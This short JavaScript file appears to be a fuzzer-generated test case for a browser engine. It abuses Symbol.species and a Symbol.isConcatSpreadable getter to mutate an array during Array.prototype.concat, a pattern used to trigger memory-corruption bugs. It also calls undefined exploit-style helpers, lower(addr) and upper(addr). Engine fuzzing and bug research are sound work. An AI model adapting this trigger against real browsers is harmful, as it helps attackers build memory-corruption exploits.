var a1 = [];
for (let i3 = 0; i3 < 256; i3++) {
    a1[i3] = i3;
}
let v11;
try { v11 = lower(addr); } catch (e) {}
let v13;
try { v13 = upper(addr); } catch (e) {}
var a2 = [v11,v13];
let v17;
try { v17 = new Function(); } catch (e) {}
var c = v17;
function f19() {
    new_array = [];
    return new_array;
}
c[Symbol?.species] = f19;
a1.constructor = c;
const v25 = Symbol?.isConcatSpreadable;
function f26() {
    new_array[0] = {};
    return true;
}
try { a2.__defineGetter__(v25, f26); } catch (e) {}
let v31;
try { v31 = a1.concat(a2); } catch (e) {}
var res = v31;
res?.[256 / 2];
